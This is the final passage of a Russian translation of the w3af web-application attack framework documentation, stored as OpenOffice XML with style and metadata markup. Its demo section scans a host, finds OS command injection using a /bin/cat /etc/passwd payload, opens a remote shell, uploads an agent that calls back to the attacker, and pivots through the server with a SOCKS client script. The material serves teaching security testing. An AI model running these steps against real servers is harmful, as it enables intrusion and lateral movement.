        <text:p text:style-name="P34">osCommanding</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">target</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/target&gt;&gt;&gt; </text:span><text:span text:style-name="T24">set target http://172.10.10.1/w3af/v.php?c=list</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/target&gt;&gt;&gt; </text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">start</text:span></text:p>
        <text:p text:style-name="P34">The list of found URLs is:</text:p>
        <text:p text:style-name="P34">http://172.10.10.1/w3af/v.php</text:p>
        <text:p text:style-name="P34">Found 1 URLs and 1 different points of injection.</text:p>
        <text:p text:style-name="P34">The list of Fuzzable requests is:</text:p>
        <text:p text:style-name="P34"><text:soft-page-break/>http://172.10.10.1/w3af/v.php | Method: GET | Parameters: (c)</text:p>
        <text:p text:style-name="P34">Starting osCommanding plugin execution.</text:p>
        <text:p text:style-name="P34">OS Commanding was found at: http://172.10.10.1/w3af/v.php .</text:p>
        <text:p text:style-name="P34">Using method: GET. The data sent was: c=%2Fbin%2Fcat+%2Fetc</text:p>
        <text:p text:style-name="P34">%2Fpasswd The vulnerability was found in the request with id 2.</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">exploit</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/exploit&gt;&gt;&gt; </text:span><text:span text:style-name="T24">exploit osCommandingShell</text:span></text:p>
        <text:p text:style-name="P34">osCommanding exploit plugin is starting.</text:p>
        <text:p text:style-name="P34">The vulnerability was found using method GET, tried to change</text:p>
        <text:p text:style-name="P34">the method to POST for exploiting but failed.</text:p>
        <text:p text:style-name="P34">Vulnerability successfully exploited.</text:p>
        <text:p text:style-name="P34">Execute "exitPlugin" to get out of the remote shell. Commands</text:p>
        <text:p text:style-name="P34">typed in this menu will be runned on the remote web server.</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11">Ничего нового. Мы настроили фреймворк, запустили сканирование и нашли уязвимость. </text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P33">w3af/exploit/osCommandingShell&gt;&gt;&gt; start w3afAgent</text:p>
        <text:p text:style-name="P34">Initializing w3afAgent system, please wait.</text:p>
        <text:p text:style-name="P34">Please wait some seconds while w3af performs an extrusion scan.</text:p>
        <text:p text:style-name="P34">The extrusion scan failed.</text:p>
        <text:p text:style-name="P34">Error: The user running w3af can't sniff on the specified</text:p>
        <text:p text:style-name="P34">interface. Hints: Are you root? Does this interface exist?</text:p>
        <text:p text:style-name="P34">Using inbound port "5060" without knowing if the remote host</text:p>
        <text:p text:style-name="P34">will be able to connect back.</text:p>
        <text:p text:style-name="P17"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Последнее сообщение показано потому что </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20"> запущен под правами обычного пользователя и сканирование не может быть произведено. Отчёт</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">об</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">удачном</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">сканировании</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">выглядит</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">примерно</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">так</text:span><text:span text:style-name="T20">:</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P34">Please wait some seconds while w3af performs an extrusion scan.</text:p>
        <text:p text:style-name="P34">ExtrusionServer listening on interface: eth1</text:p>
        <text:p text:style-name="P34">Finished extrusion scan.</text:p>
        <text:p text:style-name="P34">The remote host: "172.10.10.1" can connect to w3af with these</text:p>
        <text:p text:style-name="P34">ports:</text:p>
        <text:p text:style-name="P34">25/TCP</text:p>
        <text:p text:style-name="P34">80/TCP</text:p>
        <text:p text:style-name="P34">53/TCP</text:p>
        <text:p text:style-name="P34">1433/TCP</text:p>
        <text:p text:style-name="P34">8080/TCP</text:p>
        <text:p text:style-name="P34">53/UDP</text:p>
        <text:p text:style-name="P34">69/UDP</text:p>
        <text:p text:style-name="P34">139/UDP</text:p>
        <text:p text:style-name="P34">1025/UDP</text:p>
        <text:p text:style-name="P34">The following ports are not bound to a local process and can be</text:p>
        <text:p text:style-name="P34">used by w3af:</text:p>
        <text:p text:style-name="P34">25/TCP</text:p>
        <text:p text:style-name="P34">53/TCP</text:p>
        <text:p text:style-name="P34">1433/TCP</text:p>
        <text:p text:style-name="P34">8080/TCP</text:p>
        <text:p text:style-name="P34"><text:soft-page-break/>Selecting port "8080/TCP" for inbound connections from the</text:p>
        <text:p text:style-name="P34">compromised server to w3af.</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11">Дальше, в обоих случаях (при запуске с правами обычного пользователя и супер- пользователя), вы должны увидеть описание следующих шагов:</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P34">Starting w3afAgentClient upload.</text:p>
        <text:p text:style-name="P34">Finished w3afAgentClient upload.</text:p>
        <text:p text:style-name="P34">Please wait 30 seconds for w3afAgentClient execution.</text:p>
        <text:p text:style-name="P34">w3afAgent service is up and running.</text:p>
        <text:p text:style-name="P34">You may start using the w3afAgent that is listening on port</text:p>
        <text:p text:style-name="P34">1080. All connections made through this SOCKS daemon will be</text:p>
        <text:p text:style-name="P34">relayed using the compromised server.</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11">И теперь из другой консоли мы можем использовать socksClient для проведения соединений через атакованный сервер:</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">$ </text:span><text:span text:style-name="T24">nc 172.10.10.1 22</text:span></text:p>
        <text:p text:style-name="P34">(UNKNOWN) [172.10.10.1] 22 (ssh) : Connection refused</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">$ </text:span><text:span text:style-name="T24">python socksClient.py 127.0.0.1 22</text:span></text:p>
        <text:p text:style-name="P34">SSH2.0OpenSSH_</text:p>
        <text:p text:style-name="P34">4.3p2 Debian8ubuntu1</text:p>
        <text:p text:style-name="P34">Protocol mismatch.</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">$ </text:span><text:span text:style-name="T24">cat socksClient.py</text:span></text:p>
        <text:p text:style-name="P34">import extlib.socksipy.socks as socks</text:p>
        <text:p text:style-name="P34">import sys</text:p>
        <text:p text:style-name="P34">s = socks.socksocket()</text:p>
        <text:p text:style-name="P34">s.setproxy(socks.PROXY_TYPE_SOCKS4,"localhost")</text:p>
        <text:p text:style-name="P34">s.connect((sys.argv[1],int(sys.argv[2])))</text:p>
        <text:p text:style-name="P34">s.send('\n')</text:p>
        <text:p text:style-name="P34">print s.recv(1024)</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="Heading_20_1">Дополнительная информация</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T7">Дополнительная информация о фреймворке типа HOWTO, продвинутое использование, ошибки, TODO-</text:span><text:span text:style-name="T7">list</text:span><text:span text:style-name="T7"> и новости, могут быть найдены на домашней странице проекта:</text:span></text:p>
        <text:p text:style-name="P23">http://w3af.sf.net/</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T7">Проект w3af имеет 2 листа рассылок — один для пользователей, второй для разработчиков. Если у Вас есть какие-то вопросы или комментарии по фреймворку то обращайтесь в эти рассылки: </text:span><text:span text:style-name="T20">http://sourceforge.net/mail/?group_id=170274</text:span><text:span text:style-name="T32"> </text:span></text:p>
        <text:p text:style-name="P30"/>
        <text:p text:style-name="Heading_20_1">Ошибки и недоработки</text:p>
        <text:p text:style-name="P23">Фреймворк находится в стадии развития и имеет множество ошибок и недоработок. Если вы скачали последнюю его версию и нашли в ней какую-то ошибку, то сообщите пожалуйста нам с описанием всех деталей. Для этого обратитесь сюда: http://sourceforge.net/tracker/?group_id=170274&amp;atid=853652 </text:p>
        <text:p text:style-name="P21"/>
        <text:p text:style-name="Heading_20_1"><text:soft-page-break/>Помощники</text:p>
        <text:p text:style-name="P23">Мною всегда приветствуется помощь сторонних разработчиков. В ближайшее время будет написано руководство разработчиков по написанию плагинов. Для того чтобы узнать список ошибок и TODO-лист смотрите пожалуйста следующую ссылку:</text:p>
        <text:p text:style-name="P23">http://sourceforge.net/pm/?group_id=170274</text:p>
        <text:p text:style-name="P21"/>
        <text:p text:style-name="Heading_20_1">Последнее слово</text:p>
        <text:p text:style-name="P23">Этот документ лишь простое введение во фреймворк. Полные знания по нему могут быть получены только при непосредственной работе с ним. Делайте ошибки, учитесь на них и с каждым шагом становитесь всё умнее.</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BitstreamVeraSans-Bold" svg:font-family="BitstreamVeraSans-Bold" style:font-family-generic="swiss"/>
    <style:font-face style:name="BitstreamVeraSans-BoldOblique" svg:font-family="BitstreamVeraSans-BoldOblique, Arial" style:font-family-generic="swiss"/>
    <style:font-face style:name="BitstreamVeraSans-Oblique" svg:font-family="BitstreamVeraSans-Oblique" style:font-family-generic="swiss"/>
    <style:font-face style:name="BitstreamVeraSans-Roman" svg:font-family="BitstreamVeraSans-Roman" style:font-family-generic="swiss"/>
    <style:font-face style:name="OpenSymbol" svg:font-family="OpenSymbol,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Заголовок" style:family="paragraph" style:parent-style-name="Standard" style:next-style-name="Text_20_body">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Заголовок"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Название"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Указатель" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties text:number-lines="false" text:line-number="0"/>
    </style:style>
    <style:style style:name="Title" style:family="paragraph" style:parent-style-name="Заголовок" style:next-style-name="Subtitle" style:class="chapter"/>
    <style:style style:name="Subtitle" style:family="paragraph" style:parent-style-name="Заголовок"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Название1"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Указатель1" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties text:number-lines="false" text:line-number="0"/>
      <style:text-properties style:font-name-complex="Tahoma"/>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Указатель"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Указатель"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Указатель"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Указатель"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Указатель"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Указатель"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Указатель"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Указатель"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Оглавление_20_10" style:display-name="Оглавление 10" style:family="paragraph" style:parent-style-name="Указатель">
      <style:paragraph-properties fo:margin-left="1.7689in" fo:margin-right="0in" fo:text-indent="0in" style:auto-text-indent="false">
        <style:tab-stops>
          <style:tab-stop style:position="4.9244in" style:type="right" style:leader-style="dotted" style:leader-text="."/>
        </style:tab-stops>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="Содержимое_20_врезки" style:display-name="Содержимое врезки" style:family="paragraph" style:parent-style-name="Text_20_body"/>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Absatz-Standardschriftart" style:family="text"/>
    <style:style style:name="Основной_20_шрифт_20_абзаца" style:display-name="Основной шрифт абзаца" style:family="text"/>
    <style:style style:name="Символ_20_нумерации" style:display-name="Символ нумерации" style:family="text"/>
    <style:style style:name="Маркеры_20_списка" style:display-name="Маркеры списка"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Page_20_Number" style:display-name="Page Number" style:family="text" style:parent-style-name="Основной_20_шрифт_20_абзаца"/>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17in" fo:margin-bottom="0.1528in" style:dynamic-spacing="true"/>
      </style:header-style>
      <style:footer-style>
        <style:header-footer-properties fo:min-height="0.1917in" fo:margin-top="0.1528in" style:dynamic-spacing="true"/>
      </style:footer-style>
    </style:page-layout>
    <style:page-layout style:name="Mpm2">
      <style:page-layout-properties fo:page-width="8.2673in" fo:page-height="11.6925in" style:num-format="1" style:print-orientation="portrait" fo:margin-top="0.9791in" fo:margin-bottom="0.9791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Перевод официальной документации в w3af</dc:title>
    <meta:initial-creator>Angel</meta:initial-creator>
    <meta:creation-date>2009-06-03T18:02:00</meta:creation-date>
    <dc:creator>Taras </dc:creator>
    <dc:date>2010-04-06T01:11:17</dc:date>
    <meta:editing-cycles>17</meta:editing-cycles>
    <meta:editing-duration>PT01H07M26S</meta:editing-duration>
    <meta:generator>OpenOffice.org/3.1$Linux OpenOffice.org_project/310m19$Build-9420</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="8" meta:object-count="0" meta:page-count="28" meta:paragraph-count="753" meta:word-count="5607" meta:character-count="42928"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>